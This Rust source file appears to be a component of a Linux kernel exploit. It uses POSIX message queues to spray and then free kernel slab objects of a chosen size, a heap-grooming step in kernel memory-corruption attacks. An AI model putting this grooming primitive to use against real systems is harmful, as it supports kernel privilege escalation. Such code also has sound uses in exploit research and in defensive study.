extern crate libc;

use libc::{
    mq_open, mq_unlink, mq_send, mq_attr, 
    mqd_t, mq_getattr, mq_receive, O_CREAT, O_RDWR
};
use std::{
    mem, ptr,
    ffi::CString,
};

pub const PAGE_SIZE: i64 = 0x1000;
pub const MSG_HEADER: i64 = 0x30;
pub const KMALLOC_SIZE: i64 = 0xc0;
pub const MSG_SEGMSG_HEADER: i64 = 0x8;
pub const MAX_MSG_SIZE: i64 = PAGE_SIZE - MSG_HEADER + KMALLOC_SIZE - MSG_SEGMSG_HEADER; 
pub const MQUEUE_NAME: &str = "/abab"; 

pub fn setup_mqueue() -> Result<mqd_t, String> {
    println!("[+] Setting up mqueue");

    unsafe {
        let mq_name = CString::new(MQUEUE_NAME).unwrap();
        mq_unlink(mq_name.as_ptr());

        let mut attr: mq_attr = mem::zeroed();
        attr.mq_flags = 0;  
        attr.mq_maxmsg = 10;
        attr.mq_msgsize = MAX_MSG_SIZE;
        attr.mq_curmsgs = 0;

        let mq = mq_open(mq_name.as_ptr(), O_CREAT | O_RDWR, 0644, &attr);
        if mq < 0 {
            return Err("Failed to create/open the message queue".into());
        }

        Ok(mq)
    }
}

pub fn consume_slabs(mq: mqd_t) -> Result<(), String> {
    println!("[+] Consuming SLABs");

    let message = vec![0x77; MAX_MSG_SIZE as usize];
    let priority = 0; 

    for _ in 0..8 {
        unsafe {
            let send_result = mq_send(mq, message.as_ptr() as *const _, message.len() as usize, priority);
            if send_result < 0 {
                return Err("Failed to send message to the message queue".into());
            }
        }
    }

    Ok(())
}

pub fn release_slab(mq: mqd_t) -> Result<(), String> {
    let mut attr: mq_attr = unsafe { mem::zeroed() };

    println!("[+] Release previous msgs in the Queue");

    if unsafe { mq_getattr(mq, &mut attr) } < 0 {
        return Err("[-] mq_getattr failed".into());
    }

    println!("[+] number of msgs in queue: {}", attr.mq_curmsgs);

    if attr.mq_curmsgs == 0 {
        return Ok(());
    }

    let mut buffer = vec![0u8; MAX_MSG_SIZE.try_into().unwrap()]; 
    for _ in 0..11 { 
        let bytes = unsafe { mq_receive(mq, buffer.as_mut_ptr() as *mut _, MAX_MSG_SIZE.try_into().unwrap(), ptr::null_mut()) };
        if bytes < 0 {
            return Err("[-] mq_receive failed".into());
        }
    }

    Ok(())
}